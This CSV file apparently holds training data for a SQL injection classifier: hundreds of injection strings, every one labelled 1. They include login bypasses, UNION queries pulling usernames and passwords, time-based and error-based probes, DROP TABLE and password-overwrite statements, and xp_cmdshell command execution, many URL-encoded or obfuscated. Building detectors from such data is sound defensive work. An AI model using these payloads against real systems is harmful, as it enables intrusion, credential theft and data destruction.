Sentence,Label
""" OR 1=1#----# AND 1=1-- AND 1=1777",1
' OR '2'='2 AND 1=1 AND 1=1--173,1
admin') OR 1=1--# AND 1=1580272,1
"test' UNION SELECT 1,2,3-- AND 1=1512",1
0x27) OR 1=1--# AND 1=1--/*123,1
' OR 1=1#----# AND 1=1--# AND 1=1378,1
%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--# AND 1=1--246,1
' or 2=2--#46828,1
"test"" OR 1=1##933102/*753 AND 1=1",1
ADMIN'/* AND 1=1----647,1
""" UNION ALL SELECT NULL--/* AND 1=1964777",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889 OR 1=1-- AND 1=1",1
'; update users set password='hacked'-- AND 1=1--,1
"' union select null,null,null--# AND 1=1--491 OR 1=1",1
"1'; INSERT INTO users VALUES('hacked','pass')--739# AND 1=1",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1210784 OR 1=1--",1
"99"" OR 99 = 99 OR 1=1#/*5 OR 1=1",1
"ADMIN""/*17253168",1
"test"" UNION SELECT NULL,NULL--/* AND 1=1586",1
1'%09OR%09'1'%09=%09'1998,1
""" OR 1=1#----# AND 1=1-- AND 1=1876241",1
"user' UNION SELECT 1,2,3-- AND 1=1",1
1' OR '1' = '1 AND 1=1 AND 1=1/*993,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1774",1
%27%20UNION%20SELECT%20NULL--529,1
1' OR '1'='1' --#412640,1
2' AND SLEEP(5)--#,1
0x27 UNION ALL SELECT NULL--415482/*#60,1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437",1
%2527%2520or%25201%253D1/%252A523 AND 1=1,1
test') OR ('1'='1-- AND 1=1,1
"1"" UNION SELECT NULL----159334593107 AND 1=1/*",1
2' OR 2 = 2--730/*,1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594--",1
"useradmin"" OR ""1""=""1-- OR 1=1125737",1
' or 2=2--#46828 OR 1=1,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*108",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=166556",1
"1"" UNION SELECT NULL----159334593107",1
"admin"") OR (""1""=""1# OR 1=160148",1
admin'/**/OR/**/1=1-- OR 1=1,1
2' AND SLEEP(5)--76181,1
"test' UNION SELECT NULL,NULL--/* AND 1=1--",1
"user"" UNION SELECT NULL--/*58370",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1486",1
'/**/OR/**/'1'='1'/**/--/*75#591 AND 1=1406,1
"admin"" UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1#",1
' OR '1'='1' --/* AND 1=1793# OR 1=1421/*,1
' AND 2=CAST((SELECT @@version) AS int)--#373 OR 1=1380#,1
' OR '2'='2 AND 1=1 AND 1=1--173--,1
"useradmin"" OR 1=1--#572 OR 1=1",1
"admin1"" OR ""1"" = ""1--/*737#",1
' OR '1'='1#1 AND 1=1,1
1'%09AND%09pg_sleep(5)--860 OR 1=125816##,1
1%27%20OR%20%271%27%20%3D%20%271/*,1
"1'%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1869",1
""") OR (""1""=""1/* OR 1=1--/*885",1
' OR '2'='2277272,1
"1"" UNION SELECT NULL,NULL--# OR 1=1984 OR 1=1",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868442,1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#359",1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728146255,1
"1"" UNION SELECT NULL,NULL,NULL--149 OR 1=1 OR 1=1494#",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--835",1
""" OR 1=1#-- OR 1=1",1
"1""%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables-- OR 1=1--",1
0x27) OR 1=1--# AND 1=1,1
"""+UNION+SELECT+NULL--608168#",1
admin' OR '1'='1 AND 1=1998,1
admin1' OR '1' = '1--/*/*814-- OR 1=1,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*680 OR 1=1",1
' OR '1'='1#474#30,1
test' OR '1'='1' --714132,1
""")+OR+(""1""=""1 AND 1=1875",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1812371/*",1
') OR ('2'='2 OR 1=1,1
"1'%20UNION%20SELECT%20NULL,table_name%20FROM%20information_schema.tables--408",1
'/**/OR/**/1=1-- OR 1=1 OR 1=1,1
"admin' UNION SELECT username,password FROM users-- AND 1=1 OR 1=1978--",1
ADMIN'/* AND 1=1911 AND 1=110515741,1
"""+OR+""1""=""1--77",1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1/*",1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393539",1
"' UNION SELECT username,password FROM users-- OR 1=1667",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258,1
admin' OR '99'='99596,1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1226118",1
""" AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927 AND 1=1851",1
admin0x27/*467468 OR 1=1708,1
"""%20or%201=1#428/*61",1
' AND 2=CAST((SELECT @@version) AS int)--# AND 1=1/*581,1
user') OR 1=1-- AND 1=1882350307#--,1
"1"" UNION SELECT NULL,NULL------611--306493",1
"""/**/OR/**/""a""=""a827280",1
test' UNION SELECT NULL----/*--19,1
2' OR '2' = '2163254#784586,1
admin' UNION ALL SELECT NULL----569,1
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=1#,1
admin0x27/*467468,1
admin'/**/OR/**/1=1-- OR 1=1402 OR 1=1,1
1' UNION SELECT NULL----,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1-- OR 1=1#--",1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667",1
"""%20or%201=1# AND 1=1 OR 1=1# AND 1=1",1
"test' UNION SELECT NULL,NULL--/*978",1
') OR ('1'='1/* OR 1=1--/*248642,1
%2527%2520OR%25201%253D1/%252A--4 OR 1=1932,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--198650601#",1
' OR '2'='213/*#942,1
' OR '1'='1' --/* AND 1=1793# OR 1=1,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1",1
' or 2=2--#,1
"test' UNION SELECT NULL,NULL--/*978558",1
"admin' UNION SELECT 1,2,3----811-- OR 1=1#",1
admin' UNION SELECT NULL----607#,1
"11' UNION SELECT NULL,table_name FROM information_schema.tables--/*--/*481",1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428/*665",1
"user' UNION SELECT username,password FROM users----506",1
2' OR '2' = '2163254,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--",1
"test1"" OR ""1"" = ""1/*#",1
"admin"" OR ""1""=""195862",1
""" UNION SELECT NULL,NULL,NULL--/*",1
admin'%20OR%20'1'='1 AND 1=1 OR 1=1732,1
"admin' UNION SELECT NULL,NULL,NULL--/*#444",1
"1"" UNION SELECT NULL----159667----",1
admin' UNION ALL SELECT NULL----# AND 1=1691,1
"""+UNION+SELECT+NULL--608168",1
"user"") OR (""1""=""1--167387",1
aDMin'/* OR 1=1/*,1
admin'%20OR%20'1'='1 AND 1=1987656414589#790,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131249",1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393383",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1704",1
""" OR 1=1#----## AND 1=1274",1
"test1' UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=157437 OR 1=1",1
""" OR ""2""=""213 AND 1=1/*267",1
' OR '2'='213973 AND 1=1--53-- AND 1=1,1
' OR '2'='213973 AND 1=1--53 AND 1=1635,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--138/*--",1
admin' UNION ALL SELECT NULL--24127474161690,1
admin1' OR '1' = '1--279# AND 1=1,1
1' OR 'a'='a544#-- OR 1=1,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1#927#925",1
"test' UNION SELECT 1,2,3-- AND 1=1512355",1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--#423/*",1
user') OR ('1'='1--167387572,1
0x27) OR 1=1--# AND 1=1--/*,1
""" OR ""a""=""a83989127",1
'/**/OR/**/'a'='a922980622,1
'%09OR%09'1'='1/*,1
""";%20EXEC%20xp_cmdshell(""dir"")--591 AND 1=1108/* OR 1=1742",1
'%20or%201=1#667--,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*965",1
user') OR ('1'='1--167387,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256541",1
admin1' OR '1' = '1--279# AND 1=1 OR 1=1,1
"1'%09UNION%09SELECT%09NULL,column_name%09FROM%09information_schema.columns--#",1
1'%20AND%20pg_sleep(5)--533872437/*,1
"user"" UNION SELECT NULL--/*583",1
1'%09AND%09pg_sleep(5)--860513 OR 1=1,1
"1""%20AND%20pg_sleep(5)--533872287 OR 1=1",1
admin'/*451446794,1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236112",1
admin0x27/*467468 OR 1=1,1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1,1
' or 1=1----685526,1
"admin' UNION SELECT NULL,NULL--#122619423",1
'/**/or/**/1=1/*135--#,1
' OR '2'='213973 AND 1=1--53 AND 1=1,1
"1"" OR ""1"" = ""1 AND 1=1742395",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=1# OR 1=1225",1
"user"") OR (""1""=""128",1
"99""; INSERT INTO users VALUES(""hacked"",""pass"")-- OR 1=1-- OR 1=1#",1
'%20UNION%20ALL%20SELECT%20NULL-- AND 1=1--71444,1
"admin1"" OR ""1"" = ""1--/*737/*691",1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*233",1
useradmin' OR '1'='1--/*,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1509",1
2' OR '2' = '2163254619173,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1",1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--12",1
"ADMIN""/*172247 AND 1=1645",1
1%2527%2520AND%2520BENCHMARK%25285000000%252CMD5%2528%2527A%2527%2529%2529--309462/*317,1
'/**/or/**/1=1/*135540--,1
admin' OR '1'='1' /* AND 1=1452#,1
"'%09UNION%09SELECT%09username,password%09FROM%09users----/*",1
1'%09AND%09pg_sleep(5)--860 OR 1=1258190,1
test' OR 1=1#/*#889--,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1 AND 1=1",1
"""%20UNION%20ALL%20SELECT%20NULL--108",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311# OR 1=1",1
testadmin' OR '1'='1#624,1
"ADMIN""/*172531",1
admin' UNION ALL SELECT NULL-- AND 1=147455,1
""" UNION SELECT username,password FROM users-- OR 1=1-- OR 1=1",1
"test' UNION SELECT 1,2,3-- AND 1=1512794547",1
'+OR+1=1#/*# AND 1=1/*#/*/* OR 1=1 OR 1=1##,1
""" OR ""1""=""1 AND 1=1 OR 1=1 OR 1=1",1
aDMin'/* OR 1=1/*964,1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457",1
testadmin' OR '1'='1#624 OR 1=1,1
admin'/*451446794808,1
test' OR '1'='1' /*#/*--,1
1' UNION SELECT NULL----395225,1
ADMIN'/*172620279668,1
"user' UNION SELECT username,password FROM users------245#",1
') OR ('1'='1/*-- OR 1=1251,1
' or 1=1--73,1
"test' UNION SELECT 1,2,3-- AND 1=1512 AND 1=1760",1
ADMIN'/* AND 1=1911 AND 1=110515794,1
'+OR+1=1#/*-- AND 1=1,1
user' OR 1=1--/* OR 1=1#,1
"test"" OR 1=1##933102/*753 AND 1=1631",1
""" AND extractvalue(1,concat(0x7e,version()))--161/*#",1
"admin"" OR ""1""=""1--90",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306300",1
user' OR 1=1# AND 1=1 AND 1=1,1
user') OR ('1'='1--167387715,1
'%20or%201=1--969 OR 1=1/*487,1
') OR ('1'='1/* OR 1=1--,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----#,1
admin' UNION SELECT NULL-- AND 1=1#645,1
user' OR 1=1/*/* AND 1=1/*/*,1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210958236--217",1
admin' UNION ALL SELECT NULL-- AND 1=111/*,1
admin' OR 1=1/*## OR 1=1349697,1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*-- AND 1=1 AND 1=1--",1
' OR 99=99#12,1
"test' UNION SELECT 1,2,3--/*#974#754",1
test' UNION ALL SELECT NULL--954683,1
admin' OR 1=1#/*120637360,1
user' UNION ALL SELECT NULL--/*/*,1
"1"";+INSERT+INTO+users+VALUES(""hacked"",""pass"")--517457#99",1
"1"" UNION SELECT NULL,NULL,NULL--14992",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773618",1
"useradmin"" OR 1=1--#572 OR 1=1--",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889",1
admin'%20OR%20'1'='1 AND 1=1987656414589292,1
admin' OR '1'='1 AND 1=1998826,1
ADMIN'/* AND 1=1--#,1
testadmin' OR '1'='1#624 OR 1=1/*,1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--",1
2' OR 2 = 2--730--,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773",1
"' union select null,null,null--# AND 1=1--491#",1
1' OR 'a'='a OR 1=1#38688,1
"admin1"" OR ""1"" = ""1# AND 1=1#785489831--/*917",1
' OR '2'='213/*10375,1
""" OR ""1""=""1 AND 1=1395454",1
admin' UNION SELECT NULL-- AND 1=1#645270629,1
"testadmin"" OR 1=1-- AND 1=1126 OR 1=1",1
ADMIN'/*172620849196533243386,1
""" OR ""1""=""1--322852661",1
'%20or%201=1/*83525738383,1
"' UNION SELECT username,password FROM users-- OR 1=1",1
admin' UNION SELECT NULL----607#653,1
"ADMIN""/*172531#",1
useradmin' OR '1'='1--/*467,1
""") OR (""1""=""1/* OR 1=1--326 AND 1=1250",1
""";+EXEC+xp_cmdshell(""dir"")-- AND 1=1 AND 1=1/*374216446",1
'%20or%201=1--969 OR 1=1/*,1
"1"" UNION SELECT NULL,NULL--# OR 1=1984",1
admin0x27/* OR 1=1 AND 1=1298912,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1900",1
'/**/OR/**/'a'='a922980622971/*,1
'/**/OR/**/'1'='1'/**/--,1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables----418 OR 1=1915",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29-- AND 1=1524317,1
'%20or%201=1# AND 1=1368--381,1
"99"" AND BENCHMARK(5000000,MD5(""A""))-- OR 1=1878 OR 1=1",1
"1"" UNION SELECT NULL,NULL------611-- OR 1=1--377 OR 1=1989106673546",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--625#",1
"' union select null,null,null--# AND 1=1-- AND 1=1",1
"admin""/**/OR/**/1=1-- OR 1=1 OR 1=1756/*251",1
"admin1"" OR ""1"" = ""1--/*737",1
"admin"" UNION SELECT 1,2,3-- AND 1=1957725837",1
'; UPDATE USERS SET PASSWORD='HACKED'--69164 AND 1=1,1
"testadmin"" OR ""1""=""1 AND 1=1613186#218616306",1
"admin1"" OR ""1"" = ""1# OR 1=1/*67721",1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1311--598",1
"""/**/UNION/**/SELECT/**/NULL,NULL,NULL--306889 OR 1=1",1
admin1' OR 1 = 1 AND 1=1-- AND 1=1,1
user' OR 1=1/*/*,1
"""%20or%201=1# AND 1=1286",1
admin' OR 1=1#177840,1
admin0x27/*,1
') OR ('1'='1/* OR 1=1--/*248182,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1 AND 1=1435,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1/*",1
""" UNION ALL SELECT NULL--/* AND 1=1",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928 AND 1=1 OR 1=1406404,1
"1"" UNION SELECT NULL----159334239248199",1
"admin' UNION SELECT NULL,NULL,NULL--/*# AND 1=1665142",1
""" OR ""2""=""213 AND 1=1/*26727 AND 1=1",1
"admin"" UNION SELECT NULL,NULL,NULL--/*517 AND 1=1594 OR 1=1",1
"admin"" OR 1=1--/* OR 1=1",1
' OR '1'='1 AND 1=1 OR 1=1--,1
admin%27%20OR%20%271%27%3D%27120 AND 1=140868/*,1
"""/**/OR/**/""1""=""1""/**/--413",1
"1"";%20WAITFOR%20DELAY%20""00:00:05""--828",1
"user"" OR ""1""=""1"" -- AND 1=1/*778",1
"99'; INSERT INTO users VALUES('hacked','pass')--37281667561",1
'%09OR%09'1'='1/*/*,1
admin' UNION ALL SELECT NULL-- AND 1=1474,1
"user"") OR (""1""=""128 AND 1=1 OR 1=1",1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712 AND 1=1",1
0x27 UNION ALL SELECT NULL--415482/*921,1
admin' OR '99'='99,1
' OR '2'='213 AND 1=1/*668,1
admin') OR 1=1----774#304597,1
""" OR 1=1#----# AND 1=1-- AND 1=1876 AND 1=1",1
""" UNION ALL SELECT NULL--/* AND 1=1--",1
1'%20OR%201%20=%201575409900,1
"'%20UNION%20SELECT%20NULL,NULL,NULL----#712",1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923 OR 1=1",1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=198256",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=1",1
"""+OR+""1""=""1--77 OR 1=1",1
' or 1=1--73843,1
admin'/**/OR/**/1=1-- OR 1=1 OR 1=1756710825,1
"1""+UNION+SELECT+NULL,table_name+FROM+information_schema.tables-- AND 1=1964 AND 1=1457",1
admin' UNION SELECT NULL-- AND 1=1#645/*735 AND 1=1/*/*,1
"useradmin"" OR ""1""=""1-- OR 1=1125737817",1
""" OR ""1""=""1#474#30 AND 1=1",1
ADMIN'/*172620849196533,1
'/**/OR/**/'1'='1'/**/--/*75157 OR 1=1,1
' UNION SELECT NULL--/*622/*427/*515 OR 1=1,1
"user"" OR 1=1/*--",1
admin' OR '1'='1' --,1
"""/**/AND/**/extractvalue(1,concat(0x7e,version()))---- AND 1=1302602",1
"2"" OR ""2"" = ""2163254#/*97#133 AND 1=1",1
1'%09AND%09pg_sleep(5)--860 OR 1=125816#452,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1",1
"99"" OR 99 = 99 OR 1=1#/*307803",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350",1
%27%20OR%20%27a%27%3D%27a/*--#,1
""";+EXEC+xp_cmdshell(""dir"")--## AND 1=1--743",1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845332,1
"""%20or%201=1# AND 1=1278",1
1'%09OR%09'1'%09=%09'199884,1
""" AND extractvalue(1,concat(0x7e,version()))--161272744",1
"'/**/AND/**/extractvalue(1,concat(0x7e,version()))--761--/*##794 AND 1=134",1
""" UNION ALL SELECT NULL--/* AND 1=1--991",1
""" AND extractvalue(1,concat(0x7e,version()))-- OR 1=1278583236",1
'%20or%201=1--969 OR 1=1 AND 1=1,1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887461,1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1815 OR 1=1 OR 1=1",1
')+OR+('1'='1346,1
admin1' OR '1' = '1--/*60386608,1
user' OR '1'='1#315-- AND 1=1/*619202,1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=1# OR 1=1",1
admin' UNION ALL SELECT NULL-- AND 1=1623,1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131496",1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----791,1
'%09UNION%09ALL%09SELECT%09NULL--477,1
""" OR ""2""=""2 AND 1=1 AND 1=1--17366",1
1admin' OR 1=1--#951359,1
"""+OR+1=1#/*-- AND 1=1",1
""" OR ""2""=""213/*584636",1
' OR 1=1#/*,1
"' UNION SELECT NULL,NULL-- AND 1=1 OR 1=1189 OR 1=1 AND 1=1290",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=150991",1
' OR '1'='1#400,1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614495,1
"1'; INSERT INTO users VALUES('hacked','pass')--739-- OR 1=1518231 AND 1=1649",1
user') OR 1=1-- AND 1=1325 AND 1=167#643,1
0x27) OR 1=1--# AND 1=1 OR 1=1,1
0x27; DROP TABLE users--15# AND 1=1,1
"user"") OR (""1""=""1",1
"useradmin"" OR ""1""=""1-- OR 1=1600",1
1' OR 1=1/*/*,1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393539--",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----",1
1'----101--/*799,1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns--/* OR 1=1## OR 1=1679#",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#458/*833,1
"ADMIN""/*172--",1
' OR '2'='213/*,1
"user"" UNION SELECT 1,2,3-- AND 1=1749363",1
admin1' OR '1' = '1--/*603 AND 1=1,1
"1';+INSERT+INTO+users+VALUES('hacked','pass')-- AND 1=1248",1
' AND 2=CAST((SELECT @@version) AS int)--881553,1
"' AND 1=CONVERT(int,(SELECT @@version))-- AND 1=1953--",1
"user"" UNION SELECT NULL,NULL--/* OR 1=1428",1
test' OR '1'='1' /*#666--782939,1
1' OR '1'='1 OR 1=1257--,1
2' OR '2' = '2163254#820145,1
' OR 1=1#-- OR 1=1#81043798,1
"test1"" OR ""1"" = ""1/*# AND 1=1--631274",1
' UNION SELECT NULL--/*622/*427/*25640440,1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977750",1
10x27; WAITFOR DELAY 0x2700:00:050x27----928533,1
1'%09OR%09'1'%09=%09'1998/* OR 1=1,1
"' union select null,null,null--# AND 1=1--491 OR 1=1510",1
admin') OR 1=1--# AND 1=1580272--/*661,1
"user"" UNION SELECT NULL--/*58370 AND 1=1 AND 1=1",1
"test' UNION SELECT username,password FROM users--/*836#",1
useradmin' OR 1=1--#/*606171,1
0x27 UNION ALL SELECT NULL--415482/*92195,1
"""/**/OR/**/1=1-- OR 1=1/*857 AND 1=1 AND 1=1",1
"1""%20UNION%20SELECT%20NULL,column_name%20FROM%20information_schema.columns-- OR 1=1 OR 1=1 OR 1=1370 OR 1=1",1
'/**/OR/**/'1'='1'/**/--38,1
1%27%20AND%20BENCHMARK%285000000%2CMD5%28%27A%27%29%29----520/*,1
') OR ('1'='1/* OR 1=1/* OR 1=1 OR 1=1/*148,1
"admin' UNION SELECT NULL,NULL,NULL---- AND 1=1982781/*680",1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887,1
admin0x27/* OR 1=1 AND 1=1955,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1348--/*",1
"'/**/AND/**/1=CONVERT(int,(SELECT/**/@@version))--# AND 1=168",1
"user"") OR 1=1-- AND 1=1882350307465 AND 1=1255",1
"""%20UNION%20ALL%20SELECT%20NULL--908#565393",1
""" OR ""1""=""1"" /*##256176#",1
1%27%3B%20DROP%20TABLE%20users--/*586 AND 1=1 OR 1=1348154,1
"' UNION SELECT NULL,NULL,NULL--24179",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1704373",1
"1""; INSERT INTO users VALUES(""hacked"",""pass"")--739-- OR 1=1--343234",1
' OR 1=1#----# AND 1=1615,1
"1'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1 AND 1=1 OR 1=1 AND 1=1348--",1
') OR ('1'='1/* OR 1=1--326 AND 1=1250,1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655",1
"1"" OR ""a""=""a AND 1=1--376--546398",1
"'%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1131628",1
%2527%253B%2520SELECT%2520SLEEP%25285%2529-- AND 1=1,1
"ADMIN""/*1721",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784 OR 1=1974",1
"admin"" UNION SELECT NULL,NULL,NULL---- AND 1=1226",1
';%20EXEC%20xp_cmdshell('dir')--591 AND 1=1108/* OR 1=1#,1
""" AND extractvalue(1,concat(0x7e,version()))--161/*788318300",1
') OR ('2'='2 OR 1=1290 OR 1=1505,1
admin' OR 1=1#/*120--,1
"1"" UNION SELECT NULL----159334239248199982",1
1' OR '1' = '1 AND 1=1566 OR 1=1 OR 1=1#458/*,1
' or 1=1--73#,1
""" OR ""2""=""213/*584164",1
';%09EXEC%09xp_cmdshell('dir')---- AND 1=1887639,1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845781,1
"ADMIN""/*172247/*799",1
""" OR ""1""=""1#358706",1
"test' UNION SELECT 1,2,3----",1
"1"" OR ""1"" = ""1 AND 1=1742395401",1
"""%20or%201=1/*835 OR 1=1 OR 1=1344",1
1' OR 'a'='a OR 1=1#38688/*,1
"admin' UNION SELECT NULL,NULL--#122619",1
"test1"" UNION SELECT NULL,table_name FROM information_schema.tables-- AND 1=1----773618--",1
"99'; INSERT INTO users VALUES('hacked','pass')-- OR 1=1210784 OR 1=1717",1
ADMIN'/* AND 1=1--784,1
"""%09UNION%09ALL%09SELECT%09NULL--477/*-- AND 1=1#892-- OR 1=1923 AND 1=1",1
"admin"") OR (""1""=""1# OR 1=1601 AND 1=1",1
"""%09UNION%09SELECT%09NULL,NULL--21500 OR 1=1 OR 1=1799350977",1
""" or 2=2/* AND 1=1#",1
'/**/OR/**/'a'='a922980622971/*381,1
1' OR 'a'='a544#-- OR 1=1472 AND 1=1,1
2' AND SLEEP(5)--761163,1
"admin"" OR ""99""=""99 OR 1=1809 AND 1=1 OR 1=1224",1
admin' UNION ALL SELECT NULL--24127# AND 1=1,1
admin'%20OR%20'1'='1 AND 1=1987656414589#,1
') OR ('1'='1/* OR 1=1/* OR 1=1491,1
'/**/OR/**/1=1-- OR 1=1876-- AND 1=1769,1
'%20or%201=1# AND 1=1 AND 1=1 OR 1=1429845,1
"user' UNION SELECT NULL,NULL--# OR 1=1/*655428275",1
"test"" OR 1=1##933102/*",1
%2527%2520UNION%2520SELECT%25201%252C2%252C3--614495962,1
10x27; WAITFOR DELAY 0x2700:00:050x27-- AND 1=1728146349,1
user1' OR '1' = '1659--,1
""" union select null,null,null--860 AND 1=1# AND 1=1",1
